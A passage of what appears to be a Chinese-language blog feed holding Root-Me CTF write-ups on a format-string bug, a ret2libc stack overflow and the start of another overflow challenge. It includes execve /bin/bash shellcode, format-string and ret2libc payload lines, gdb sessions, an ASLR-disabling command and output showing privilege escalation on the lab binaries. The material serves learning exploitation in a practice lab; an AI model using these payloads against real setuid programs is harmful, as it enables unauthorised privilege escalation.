&#x27;print(&quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&quot;)&#x27;`</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">1</span>s <span class="number">0xbffffe02</span>+<span class="number">0xa</span></span><br><span class="line"><span class="number">0xbffffe0c</span>:     <span class="string">&quot;j\vX\231Rfh-p\211\341Rjhh/bash/bin\211\343RQS\211\341\315\200&quot;</span></span><br></pre></td></tr></table></figure><p>palyload:<br>(python -c “print ‘%117x’ + ‘\x0c\xfe\xff\xbf’”;cat) | ./ch17</p><p>但是报段错误，还没想到原因。</p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>原因应该是gdb内外的地址是不一样的<br><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a><br>使用这篇中的findenv.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;environment var&gt; &lt;target program name&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = getenv(argv[<span class="number">1</span>]);</span><br><span class="line">    ptr += (<span class="built_in">strlen</span>(argv[<span class="number">0</span>]) - <span class="built_in">strlen</span>(argv[<span class="number">2</span>])) * <span class="number">2</span>;  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s will be at %p\n&quot;</span>, argv[<span class="number">1</span>], ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用touch，vim命令创建文件</p><pre><code>app-systeme-ch17@challenge02:~$ /tmp/findenv SHELLCODE ./ch17SHELLCODE will be at 0xbffffe31app-systeme-ch17@challenge02:~$ (python -c &quot;print &#39;%117x&#39;+&#39;\x31\xfe\xff\xbf&#39;&quot; ;cat ) | ./ch17Username: Bad username: %117x1þÿ¿iduid=1117(app-systeme-ch17) gid=1117(app-systeme-ch17) euid=1217(app-systeme-ch17-cracked) groups=1117(app-systeme-ch17),100(users)</code></pre><h3 id="学到的命令"><a href="#学到的命令" class="headerlink" title="学到的命令"></a>学到的命令</h3><p><code>show env PATH</code></p><p><code>echo $PATH</code></p><p>%x 打印32位</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Format-String-Bug-Basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-String-Bug-Basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format String Bug Basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Format String Bug Basic 3&lt;/h1&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - Stack buffer overflow basic 6</title>
    <link href="http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/"/>
    <id>http://finsenty54.github.io/2020/12/31/Stack_buffer_overflow_basic_6/</id>
    <published>2020-12-31T06:08:34.000Z</published>
    <updated>2020-12-31T06:36:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-Stack-buffer-overflow-basic-6"><a href="#ELF-x86-Stack-buffer-overflow-basic-6" class="headerlink" title="ELF x86 - Stack buffer overflow basic 6"></a>ELF x86 - Stack buffer overflow basic 6</h1><p><code>return to libc</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">20</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;Usage: %s &lt;message&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    setreuid(geteuid(), geteuid());</span><br><span class="line">    <span class="built_in">strcpy</span> (message, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Your message: %s\n&quot;</span>, message);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="知识学习"><a href="#知识学习" class="headerlink" title="知识学习"></a>知识学习</h2><h3 id="setuid-amp-setgid"><a href="#setuid-amp-setgid" class="headerlink" title="setuid &amp; setgid"></a>setuid &amp; setgid</h3><p>When the** setuid or setgid <strong>attributes are set on an executable file, then any users able to **execute the file will automatically execute the file with the privileges of the file’s owner (commonly root)</strong> and/or the file’s group, depending upon the flags set<br>普通用户提升权限运行<br>The setuid and setgid bits are normally set with the command chmod by setting the high-<strong>order octal digit to 4 for setuid or 2 for setgid</strong>. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file,** the process will run with user and group permissions set upon it by its owner**. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.<br><code>chmod +s</code></p><h3 id="防御-降权-seteuid"><a href="#防御-降权-seteuid" class="headerlink" title="防御-降权 seteuid()"></a>防御-降权 seteuid()</h3><p>Normal approach followed by root setuid programs is to drop root privileges before getting input from the user. Thus even when user input is malicious, attacker wont get a root shell.<br>root setuid接收用户输入后，丢弃root权限<br>For** example below vulnerable code **wont allow the attacker to get a root shell.</p><pre><code> seteuid(getuid()); /* Temporarily drop privileges */ </code></pre><h3 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h3><p>When a directory’s sticky bit is set, the filesystem treats the files in such directories in a special way <strong>so only the file’s owner,</strong> the directory’s owner, or root user can rename or delete the file. </p><pre><code>ls -l testchmod +t test; ls -l test</code></pre><h3 id="setreuid"><a href="#setreuid" class="headerlink" title="setreuid()"></a>setreuid()</h3><p><code>setreuid(geteuid(), geteuid());</code> 这是提升权限<br>每个Linux进程都有有两个相关的用户ID：实际用户ID（即ruid）和有效用户ID（即euid），其中ruid表示了该进程由谁运行，即当前系统环境用户是谁，主要回答who am I?的问题；而euid则用来规范进程的实际权限控制。比如passwd文件存放了用户名和密码，当一个普通用户运行passwd时，其ruid是自己，而euid则临时变为了文件的所有者root。<br>setreuid的作用在于设置ruid和euid</p><h3 id="geteuid"><a href="#geteuid" class="headerlink" title="geteuid()"></a>geteuid()</h3><p>geteuid()用来取得执行目前进程有效的用户识别码. 有效的用户识别码用来<strong>决定进程执行的权限,</strong> 借由此改变此值, 进程可以<strong>获得额外的权限</strong>. 倘若执行文件的setID 位已被设置, 该文件执行时, 其进程的euid值便会设成该文件所有者的uid. 例如, 执行文件/usr/bin/passwd 的权限为-r-s–x–x, 其s 位即为setID(SUID)位, 而当任何用户在执行passwd 时其有效的用户识别码会被设成passwd 所有者的uid 值, <strong>即root 的uid 值(0)</strong>.</p><pre><code>app-systeme-ch13@challenge02:~$ ls -l ./ch13-r-sr-x--- 1 app-systeme-ch13-cracked app-systeme-ch13 7360 May 19  2019 ./ch13</code></pre><h3 id="关闭ASLR-原来值是2"><a href="#关闭ASLR-原来值是2" class="headerlink" title="关闭ASLR 原来值是2"></a>关闭ASLR 原来值是2</h3><p>使用<code>sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code>即可关闭ASLR</p><hr><h2 id="ret2lic入门"><a href="#ret2lic入门" class="headerlink" title="ret2lic入门"></a>ret2lic入门</h2><p><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/">https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//vuln.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span> </span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf); <span class="comment">/* [3] */</span></span><br><span class="line"> fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>r $(python2 -c &quot;print &#39;A&#39;*270&quot;)</code><br>溢出 64位下<br><code>Invalid $PC address: 0x414141414141</code></p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>逆向</p><pre><code>gdb-peda$ r $(python -c &quot;print &#39;a&#39;*36&quot;)Stopped reason: SIGSEGV0x61616161 in ?? ()</code></pre><p>查看</p><pre><code>gdb-peda$ print system$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e68310 &lt;system&gt;gdb-peda$ print exit$3 = &#123;&lt;text variable, no debug info&gt;&#125; 0xb7e5b260 &lt;exit&gt;x/4000s $rsp0xbffffef8:     &quot;SHELL=/bin/bash&quot;gdb-peda$ x/s 0xbffffef8+60xbffffefe:     &quot;/bin/bash&quot;、x</code></pre><p>将这三项连接在一起<br><code>r $(python -c &quot;print &#39;a&#39;*32+&#39;\x10\x83\xe6\xb7&#39;+&#39;\x60\xb2\xe5\xb7&#39;+&#39;\xfe\xfe\xff\xbf&#39;&quot;) </code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·`²å·þþÿ¿</span><br><span class="line">[New process <span class="number">5677</span>]</span><br><span class="line">process <span class="number">5677</span> is executing <span class="keyword">new</span> program: /bin/dash</span><br><span class="line">Error in re-setting breakpoint <span class="number">1</span>: Function <span class="string">&quot;main&quot;</span> <span class="keyword">not</span> defined.</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint <span class="number">2.</span></span><br><span class="line">Cannot access memory at address </span><br></pre></td></tr></table></figure><p>报错不成功</p><p><code>(gdb) info proc map</code><br>查看虚拟空间布局</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Start Addr   End Addr       Size     Offset objfile</span><br><span class="line"> 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33</span><br><span class="line"> 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33</span><br><span class="line">0xb7e27000 0xb7e28000     0x1000        0x0</span><br><span class="line">0xb7e28000 0xb7fd3000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd3000 0xb7fd5000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd5000 0xb7fd6000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6</span><br><span class="line">0xb7fd6000 0xb7fda000     0x4000        0x0</span><br><span class="line">0xb7fda000 0xb7fdd000     0x3000        0x0 [vvar]</span><br><span class="line">0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]</span><br><span class="line">0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xb7fff000 0xb8000000     0x1000    0x20000 /libold/i386-linux-gnu/ld-2.19.so</span><br><span class="line">0xbffdf000 0xc0000000    0x21000        0x0 [stack]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查找”/bin/sh”在libc中的位置</p><pre><code>gdb-peda$ searchmem &quot;/bin/sh&quot; 0xb7e27000 0xb7fd6000Searching for &#39;/bin/sh&#39; in range: 0xb7e27000 - 0xb7fd6000Found 1 results, display max 1 items:libc.so.6 : 0xb7f8ad4c (&quot;/bin/sh&quot;)</code></pre><p>或者<br><code>gdb-peda$ find &quot;/bin/sh&quot;</code></p><p>成功，中间exit()不用连接也可以<br>for exiting without segmentation fault, it’s necessary to replace the ‘DDDD’ with a valid address (e.g address to libc’s exit function).<br>需要退出没有段报错，将DDDD用exit替换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app-systeme-ch33@challenge02:~$ ./ch33 $(python -c <span class="string">&quot;print &#x27;a&#x27;*32+&#x27;\x10\x83\xe6\xb7&#x27;+&#x27;AAAA&#x27;+&#x27;\x4c\xad\xf8\xb7&#x27;&quot;</span>)</span><br><span class="line">Your message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaƒæ·AAAAL­ø·</span><br><span class="line">$ id</span><br><span class="line">uid=1233(app-systeme-ch33-cracked) gid=1133(app-systeme-ch33) groups=1133(app-systeme-ch33),100(users)</span><br><span class="line">$ cat .passwd</span><br></pre></td></tr></table></figure><p><code>/bin/sh</code> used to point to<code>/bin/bash</code>on most GNU/Linux systems.</p><hr><p>查看布局的另一种方法<br><code>maintenance info sections ALLOBJ</code><br>Object file: /lib/x86_64-linux-gnu/libc.so.6<br> [0]      0x7ffff7de42e0-&gt;0x7ffff7de4304 at 0x000002e0: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [1]      0x7ffff7de4304-&gt;0x7ffff7de4324 at 0x00000304: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [2]      0x7ffff7de4328-&gt;0x7ffff7de781c at 0x00000328: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [3]      0x7ffff7de7820-&gt;0x7ffff7deb4d4 at 0x00003820: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [4]      0x7ffff7deb4d8-&gt;0x7ffff7df9308 at 0x000074d8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS<br> [5]      0x7ffff7df9308-&gt;0x7ffff7dff3c9 at 0x00015308: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ELF-x86-Stack-buffer-overflow-basic-6&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-6&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 6&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 6&lt;/h1&gt;&lt;p&gt;&lt;code&gt;return to libc&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; ** argv)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; message[&lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (argc != &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Usage: %s &amp;lt;message&amp;gt;\n&amp;quot;&lt;/span&gt;, argv[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    setreuid(geteuid(), geteuid());&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;strcpy&lt;/span&gt; (message, argv[&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt; (&lt;span class=&quot;string&quot;&gt;&amp;quot;Your message: %s\n&amp;quot;&lt;/span&gt;, message);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>ELF x86 - stack buffer overflow basic 4</title>
    <link href="http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/"/>
    <id>http://finsenty54.github.io/2020/12/29/stack_buffer_overflow_basic_4/</id>
    <published>2020-12-29T13:26:05.000Z</published>
    <updated>2020-12-29T13:54:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ELF-x86-stack-buffer-overflow-basic-4"><a href="#ELF-x86-stack-buffer-overflow-basic-4" class="headerlink" title="ELF x86 - stack buffer overflow basic 4"></a>ELF x86 - stack buffer overflow basic 4</h1><p>参考: </p><ol><li><a href="https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204">https://github.com/s1syphu5/RootMe-Challenges/tree/master/System/ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204</a></li><li><a href="https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md">https://gitlab.com/rsheasby/root-me-app-system/-/blob/master/09.%20ELF%20x86%20-%20Stack%20buffer%20overflow%20basic%204/instructions.md</a></li><li><a href="http://showlinkroom.me/2017/12/04/Root-me-App-System02/">http://showlinkroom.me/2017/12/04/Root-me-App-System02/</a></li><li><a href="https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution">https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4?action_solution=voir#ancre_solution</a></li></ol><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><code>struct EnvInfo GetEnv(void)&#123;&#125;</code> 中有<code>strcpy()</code>函数，存在溢出点。</p><pre><code>            +----------------------------+            |      HOME env variable     |     %ebp - 540            +----------------------------+            |    USERNAME env variable   |     %ebp - 412            +----------------------------+            |      SHELL env variable    |     %ebp - 284            +----------------------------+            |      PATH env variable     |     %ebp - 156            +----------------------------+            |           saved ebp        |            +----------------------------+            |        return address      |     %ebp + 4            +----------------------------+            |   rep movsl dest. address  |     %ebp + 8            +----------------------------+  </code></pre><a id="more"></a><p>Since 540 - 128 = 412, 412 - 128 = 284 and 284 - 128 = 156, we get the following stack summary:</p><ul><li>%ebp - 540​ | env.home​​ ​​</li><li>%ebp - 412 | env.username</li><li>%ebp - 284 | env.shell</li><li>%ebp - 156 | env.path</li><li>%ebp | saved frame pointer</li><li>%ebp + 4 | saved EIP</li><li>%ebp + 8 | rep movsl destination address</li></ul><p>var char *dest @ ebp-0x21c</p><p>0x08048590 e8dbfdffff     sym.imp.strcpy ();[og] 第二次的赋值，USERNAME</p><pre><code>gdb-peda$ x/101xw 0xbffff3cc 存输入值0xbffff3cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff3fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff40c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff41c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff42c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff43c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff44c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff45c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff46c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff47c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff48c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff49c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ac:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4bc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4cc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4dc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4ec:     0x61616161      0x61616161      0x61616161      0x616161610xbffff4fc:     0x61616161      0x61616161      0x61616161      0x616161610xbffff50c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff51c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff52c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff53c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff54c:     0x61616161      0x61616161      0x61616161      0x616161610xbffff55c:     0x0804a000</code></pre><p><code>EAX: 0xbffff44c (&#39;a&#39; &lt;repeats 200 times&gt;...)</code><br>存shell 字符串</p><p><code>EAX: 0xbffff4cc (&#39;a&#39; &lt;repeats 128 times&gt;, &quot;e\377\377\277&quot;, &#39;a&#39; &lt;repeats 12 times&gt;)</code><br>放path</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> disas 